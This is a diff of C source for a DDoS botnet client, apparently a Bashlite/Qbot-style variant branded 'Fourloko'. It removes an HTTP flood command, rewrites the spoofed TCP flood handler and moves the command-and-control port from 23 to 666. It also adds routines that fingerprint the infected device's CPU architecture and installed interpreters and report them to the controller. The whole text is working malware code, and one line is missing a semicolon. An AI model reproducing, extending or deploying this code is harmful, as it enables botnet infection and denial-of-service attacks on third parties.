         {
                 if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65500 || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1))
@@ -1145,14 +1366,6 @@ void processCmd(int argc, unsigned char *argv[])
                 }
         }
  
-        if (!strcmp(argv[0], "HTTP"))
-    {
-        if (argc < 6 || atoi(argv[3]) < 1 || atoi(argv[5]) < 1) return;
-        if (listFork()) return;
-        sockprintf(mainCommSock, "HTTP %s Flooding %s:%d for %d seconds", argv[1], argv[2], atoi(argv[3]), atoi(argv[5]));
-        sendHTTP(argv[1], argv[2], atoi(argv[3]), argv[4], atoi(argv[5]), atoi(argv[6]));
-        exit(0);
-    }
         if(!strcmp(argv[0], "STD"))
         {
             if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
@@ -1186,42 +1399,42 @@ void processCmd(int argc, unsigned char *argv[])
             
         }
  
-        if(!strcmp(argv[0], "TCP"))
+        if (!strcmp(argv[0], "TCP"))
+{
+    if (argc < 5 || atoi(argv[2]) < 0 || atoi(argv[3]) <= 0 || atoi(argv[4]) < 0 || atoi(argv[4]) > 32 || (argc > 6 && atoi(argv[6]) < 0) || (argc == 7 && atoi(argv[6]) < 1))
+    {
+        sockprintf(mainCommSock, "Usage: TCP <target> <port> <time> <netmask (0-32)> (packet size, default 0) (poll interval, default 10)");
+        return;
+    }
+
+    unsigned char *ip = argv[1];
+    int port = atoi(argv[2]);
+    int time = atoi(argv[3]);
+    int spoofed = atoi(argv[4]);
+    int psize = (argc > 5) ? atoi(argv[5]) : 0;
+    int pollinterval = (argc > 6) ? atoi(argv[6]) : 10;
+
+    if (strstr(ip, ",") != NULL)
+    {
+        unsigned char *hi = strtok(ip, ",");
+        while (hi != NULL)
         {
-                if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[4]) > 32 || (argc > 6 && atoi(argv[6]) < 0) || (argc == 8 && atoi(argv[7]) < 1))
-                {
-                        //sockprintf(mainCommSock, "TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
-                        return;
-                }
- 
-                unsigned char *ip = argv[1];
-                int port = atoi(argv[2]);
-                int time = atoi(argv[3]);
-                int spoofed = atoi(argv[4]);
-                unsigned char *flags = argv[5];
- 
-                int pollinterval = argc == 8 ? atoi(argv[7]) : 10;
-                int psize = argc > 6 ? atoi(argv[6]) : 0;
- 
-                if(strstr(ip, ",") != NULL)
-                {
-                        unsigned char *hi = strtok(ip, ",");
-                        while(hi != NULL)
-                        {
-                                if(!listFork())
-                                {
-                                        sendTCP(hi, port, time, spoofed, flags, psize, pollinterval);
-                                        _exit(0);
-                                }
-                                hi = strtok(NULL, ",");
-                        }
-                } else {
-                        if (listFork()) { return; }
- 
-                        sendTCP(ip, port, time, spoofed, flags, psize, pollinterval);
-                        _exit(0);
-                }
+            if (!listFork())
+            {
+                sendTCP(hi, port, time, spoofed, psize, pollinterval);
+                _exit(0);
+            }
+            hi = strtok(NULL, ",");
         }
+    }
+    else
+    {
+        if (listFork()) return;
+        sendTCP(ip, port, time, spoofed, psize, pollinterval);
+        _exit(0);
+    }
+}
+
  
     if(!strcmp(argv[0], "KILLATTK"))
         {
@@ -1257,7 +1470,7 @@ int initConnection()
         else currentServer++;
  
         strcpy(server, commServer[currentServer]);
-        int port = 23;
+        int port = 666;
         if(strchr(server, ':') != NULL)
         {
                 port = atoi(strchr(server, ':') + 1);
@@ -1319,6 +1532,38 @@ int getOurIP()
         close(sock);
 }
  
+char *getArch() {
+    #if defined(__x86_64__) || defined(_M_X64)
+    return "x86_64";
+    #elif defined(i386) || defined(__i386__) || defined(__i386) || defined(_M_IX86)
+    return "x86_32";
+    #elif defined(__ARM_ARCH_2__) || defined(__ARM_ARCH_3__) || defined(__ARM_ARCH_3M__) || defined(__ARM_ARCH_4T__) || defined(__TARGET_ARM_4T)
+    return "Arm4";
+    #elif defined(__ARM_ARCH_5_) || defined(__ARM_ARCH_5E_)
+    return "Arm5"
+    #elif defined(__ARM_ARCH_6T2_) || defined(__ARM_ARCH_6T2_) ||defined(__ARM_ARCH_6__) || defined(__ARM_ARCH_6J__) || defined(__ARM_ARCH_6K__) || defined(__ARM_ARCH_6Z__) || defined(__ARM_ARCH_6ZK__) || defined(__aarch64__)
+    return "Arm6";
+    #elif defined(__ARM_ARCH_7__) || defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__)
+    return "Arm7";
+    #elif defined(mips) || defined(__mips__) || defined(__mips)
+    return "Mips";
+    #elif defined(mipsel) || defined (__mipsel__) || defined (__mipsel) || defined (_mipsel)
+    return "Mipsel";
+    #elif defined(__sh__)
+    return "Sh4";
+    #elif defined(__powerpc) || defined(__powerpc__) || defined(__powerpc64__) || defined(__POWERPC__) || defined(__ppc__) || defined(__ppc64__) || defined(__PPC__) || defined(__PPC64__) || defined(_ARCH_PPC) || defined(_ARCH_PPC64)
+    return "Ppc";
+    #elif defined(__sparc__) || defined(__sparc)
+    return "spc";
+    #elif defined(__m68k__)
+    return "M68k";
+    #elif defined(__arc__)
+    return "Arc";
+    #else
+    return "Unknown Architecture";
+    #endif
+}
+
 char *getBuild()
 {
     #ifdef MIPS_BUILD
@@ -1335,6 +1580,25 @@ char *getBuild()
     return "GAYGFT";
     #endif
 }
+
+char *getPortz()
+{
+        if(access("/usr/bin/python", F_OK) != -1){
+        return "22";
+        }
+        if(access("/usr/bin/python3", F_OK) != -1){
+        return "22";
+        }
+        if(access("/usr/bin/perl", F_OK) != -1){
+        return "22";
+        }
+        if(access("/usr/sbin/telnetd", F_OK) != -1){
+        return "22";
+        } else {
+        return "Unknown Port";
+        }
+}
+
  
 int main(int argc, unsigned char *argv[])
 {
@@ -1375,7 +1639,7 @@ int main(int argc, unsigned char *argv[])
         {
                 if(initConnection()) { sleep(5); continue; }
  
-        sockprintf(mainCommSock, "BUILD %s", getBuild());
+        sockprintf(mainCommSock, "\e[0m[\e[1;31mFourloko\e[0m][\e[1;31m%s\e[0m]\e[1;31m:\e[0m[\e[1;31m%s\e[0m] \e[1;31m>\e[0m [\e[1;31m%s\e[0m] [\e[1;31m%s\e[0m]", inet_ntoa(ourIP), getBuild(), getPortz(), getArch());
  
                 char commBuf[4096];
                 int got = 0;
